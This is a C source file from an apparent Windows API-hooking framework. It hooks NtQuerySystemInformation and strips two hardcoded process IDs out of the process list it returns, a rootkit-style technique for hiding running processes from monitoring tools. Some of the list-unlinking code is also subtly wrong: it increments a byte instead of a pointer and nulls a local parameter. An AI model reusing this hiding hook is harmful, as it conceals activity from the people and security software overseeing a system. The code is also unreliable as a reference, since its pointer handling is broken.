#include <windows.h>
#include <ntsecapi.h>

#include "./Dispatch_NTDLL_NtQuerySystemInformation.h"
#include "../Common/DebugLog.h"
#include "./HookHelp.h"
#include "./GetProcAddressEx.h"



//
//Global
//
__pfnNtQuerySystemInformation pfnNtQuerySystemInformation = NULL;



//
//Dispatch_NTDLL_NtQuerySystemInformation Functions
//
NTSTATUS
NTAPI
OnNtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID               SystemInformation,
	IN ULONG                SystemInformationLength,
	OUT PULONG              ReturnLength OPTIONAL )
{
	NTSTATUS nRet;

	DWORD dwRetAddr = 0;
	__asm
	{
		mov eax, [ebp+4];
		sub eax, 5;
		mov dwRetAddr, eax;
	}
	if( IsBypassCaller(dwRetAddr) )
	{
		nRet = pfnNtQuerySystemInformation(
			SystemInformationClass,
			SystemInformation,
			SystemInformationLength,
			ReturnLength
			);

		return nRet;
	}

	nRet = pfnNtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength
		);

	//
	//Check if is succeed
	//
	if( nRet < 0 )
	{
		return nRet;
	}

	//
	//Check if is a process request
	//
	if( SystemInformationClass != SystemProcessesAndThreadsInformation )
	{
		return nRet;
	}

	//
	//Fake the data
	//
	int NbProcessToHide = 2;
	int ProcessToHide[2];
	ProcessToHide[0] = 4;
	ProcessToHide[1] = 888;

	PSYSTEM_PROCESS_INFORMATION Curr = NULL;
	PSYSTEM_PROCESS_INFORMATION Prev = NULL;

	for(int i=0; i<NbProcessToHide; i++)
	{
		Curr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while(TRUE)
		{
			if( Curr->ProcessName.Buffer != NULL )
			{
				if( Curr->ProcessId== ProcessToHide[i] )
				{
					if( Prev )
					{
						//There was a process before
						if(Curr->NextEntryDelta)//If there is a process after
						{
							//Previous process leads to next 
							Prev->NextEntryDelta += Curr->NextEntryDelta;
						}
						else
						{
							//Previous process is the last one
							Prev->NextEntryDelta=0;
						}
						break;
					}//Prev
					else
					{
						//Is first process     
						if(Curr->NextEntryDelta) // if there is a process after it
						{
							//First process becomes this one
							*(PBYTE)SystemInformation += Curr->NextEntryDelta;
						}
						else 
						{
							// no process
							SystemInformation = NULL;
						}
						break;
					}
				}//Curr->ProcessId
			}//Curr->ProcessName

			if(!Curr->NextEntryDelta)
			{
				break;
			}

			//Not a process to hide, prev ptr go to this process
			Prev = Curr;

			//Curr go to next process
			Curr = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)Curr + Curr->NextEntryDelta);
		}//while
	}//for

	return nRet;
}

NTSTATUS
NTAPI
NtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID               SystemInformation,
	IN ULONG                SystemInformationLength,
	OUT PULONG              ReturnLength OPTIONAL )
{
	NTSTATUS ret = 0;
	HINSTANCE hDll = GetModuleHandleW(L"ntdll.dll");
	__pfnNtQuerySystemInformation addFun = (__pfnNtQuerySystemInformation)GetProcAddressEx(hDll,"NtQuerySystemInformation");
	if(addFun)
	{
		ret = addFun(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);
	}
	return ret;
}